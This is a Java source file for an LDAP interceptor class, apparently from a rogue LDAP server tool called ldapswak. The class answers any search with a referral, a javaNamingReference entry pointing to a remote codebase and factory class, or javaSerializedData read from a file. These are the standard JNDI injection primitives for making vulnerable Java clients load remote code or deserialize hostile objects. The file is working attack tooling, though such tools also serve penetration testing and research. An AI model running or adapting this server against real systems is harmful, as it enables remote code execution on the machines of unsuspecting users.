package gs.sy.m8.ldapswak;

import java.io.IOException;
import java.net.MalformedURLException;
import java.nio.file.Files;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Control;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import com.unboundid.ldap.sdk.SearchResultReference;

public class JNDIOperationInterceptor extends InMemoryOperationInterceptor {

	private static final Logger log = LoggerFactory.getLogger(JNDIOperationInterceptor.class);

	private final JNDIServer jndiServer;

	public JNDIOperationInterceptor(JNDIServer jndiServer) {
		this.jndiServer = jndiServer;
	}

	/**
	 * {@inheritDoc}
	 *
	 * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)
	 */
	@Override
	public void processSearchResult(InMemoryInterceptedSearchResult result) {
		String base = result.getRequest().getBaseDN();
		Entry e = new Entry(base);
		try {
			if (this.jndiServer.referral != null) {
				sendReferral(result, base, e);
			} else if (this.jndiServer.refCodebase != null) {
				sendCodebaseResult(result, base, e);
			} else if ( this.jndiServer.serialized != null ) {
				sendSerializedResult(result, base, e);
			} else {
				super.processSearchResult(result);
			}
		} catch (Exception e1) {
			e1.printStackTrace();
		}

	}

	private void sendReferral(InMemoryInterceptedSearchResult result, String base, Entry e)
			throws LDAPException, MalformedURLException {
		String ref = this.jndiServer.referral;
		log.info("Sending refferal to {}", ref);
		result.sendSearchReference(new SearchResultReference(new String[] { ref }, new Control[] {}));
		result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
	}

	private void sendCodebaseResult(InMemoryInterceptedSearchResult result, String base, Entry e)
			throws LDAPException, MalformedURLException {
		e.addAttribute("javaCodeBase", this.jndiServer.refCodebase.toString());
		e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
		e.addAttribute("javaFactory", this.jndiServer.refClass);
		result.sendSearchEntry(e);
		result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
	}

	
	private void sendSerializedResult(InMemoryInterceptedSearchResult result, String base, Entry e)
			throws LDAPException, MalformedURLException {
		byte[] data;
		try {
			data = Files.readAllBytes(this.jndiServer.serialized);
		} catch (IOException e1) {
			log.error("Failed to read serialized data at " + this.jndiServer.serialized, e1);
			return;
		}		
		e.addAttribute("objectClass", "javaSerializedData"); //$NON-NLS-1$
		e.addAttribute("javaSerializedData", data);
		result.sendSearchEntry(e);
		result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
	}
	

}
